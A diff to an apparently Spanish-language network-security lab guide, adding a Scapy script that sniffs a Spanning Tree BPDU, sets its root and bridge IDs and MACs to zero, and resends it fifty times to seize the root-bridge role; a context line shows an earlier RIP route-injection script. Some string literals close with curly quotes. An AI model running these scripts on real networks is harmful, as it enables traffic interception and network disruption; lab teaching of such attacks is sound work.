@@ -41,3 +41,19 @@ PDU /= RIPEntry(AF=2, RouteTag=1354, addr="2.0.0.0", mask="255.0.0.0", nextHop="
 sendp(PDU)
 ```
 ## Creacion de script para la manipulacion de STP
+```
+nano stp.py
+```
+```
+from scapy.all import *
+PDU = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
+PDU[0].src="00:00:00:00:00:00”
+PDU[0].rootid=0
+PDU[0].rootmac="00:00:00:00:00:00”
+PDU[0].bridgeid=0
+PDU[0].bridgemac="00:00:00:00:00:00”
+for i in range (0, 50):
+    sendp(PDU[0])
+    time.sleep(2)
+```
+
